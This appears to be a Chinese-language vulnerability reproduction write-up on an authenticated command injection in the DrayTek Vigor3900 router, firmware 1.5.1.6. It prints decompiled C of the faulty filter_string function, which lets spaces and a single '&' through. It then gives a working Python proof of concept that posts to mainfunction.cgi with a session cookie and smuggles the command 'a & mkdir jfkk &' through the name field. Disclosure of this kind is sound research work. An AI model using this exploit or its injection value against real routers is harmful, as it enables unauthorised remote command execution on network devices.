# vigor3900中存在授权后的命令注入漏洞

## 1、基本信息

- 供应商：`DrayTek`
- 产品型号：`vigor3900`
- 影响版本：`1.5.1.6`
- 漏洞类型：命令注入

## 2、漏洞描述

`vigor3900`路由器的`1.5.1.6`固件版本的二进制文件中存在授权后的命令注入漏洞，漏洞位于`/www/cgi-bin/mainfunction.cgi`文件中，由于该文件在处理请求时，对相关字段的值进行过滤时考虑不当，攻击者可以构造恶意的 HTTP 消息，从而在远程执行任意代码。

![image-20240817154411363](C:\Users\lenovo\Desktop\CVE_Reproduce\vigor3900漏洞\pic\image-20240817154411363.png)

由上图可以看出，我们可以控制`name`字段的值，从而控制`run_command`函数的执行，在获取到`name`字段的值后，会赋值给`value`，然后通过`filter_string`函数对`value`进行过滤，代码如下所示，可以发现，该函数并未过滤`空格`和`&`字符，这将导致命令注入。

```c
unsigned __int8 *__fastcall filter_string(unsigned __int8 *result)
{
  unsigned __int8 *i; // r2
  int v2; // r3
  bool v3; // zf
  _BOOL4 v4; // r3

  for ( i = result; i; ++i )
  {
    v2 = *i;
    v3 = v2 == ';';
    if ( v2 != ';' )
      v3 = v2 == '%';
    if ( v3
      || v2 == '`'
      || v2 == '|'
      || v2 == '>'
      || v2 == '\''
      || v2 == '"'
      || v2 == '$'
      || v2 == '\t'
      || v2 == '\n'
      || v2 == '\r' )
    {
      *i = '+';
    }
    else
    {
      v4 = v2 == '&';
      if ( i == (unsigned __int8 *)-1 )
        v4 = 0;
      if ( v4 && i[1] == '&' )
        qmemcpy(i, "++", 2);
      if ( !*i )
        return result;
    }
  }
  return result;
} 
```

## 3、漏洞验证

构建的POC如下，其中，要有相关的`Cookie`值。

```python
def send_post_request(ip_address, session_cookie, name_value):
    url = f"http://{ip_address}/cgi-bin/mainfunction.cgi"
    
    headers = {
        "Host": ip_address,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": session_cookie,
        "Connection": "close"
    }

    data = {
        "action": "get_cert_content",
        "type": "trustca",
        "name": name_value
    }

    response = requests.post(url, headers=headers, data=data)
    return response.text

ip_address = "10.10.10.2"
session_cookie = "SESSION_ID_VIGOR=7:F657C2D5AE041116E7003E8F7C8B7EFA"
name_value = "a & mkdir jfkk &"

response_text = send_post_request(ip_address, session_cookie, name_value)
print(response_text)
```

由下可以看出，我们成功创建了一个名为`jfkk`的文件夹

![image-20240817160108571](C:\Users\lenovo\Desktop\CVE_Reproduce\vigor3900漏洞\pic\image-20240817160108571.png)





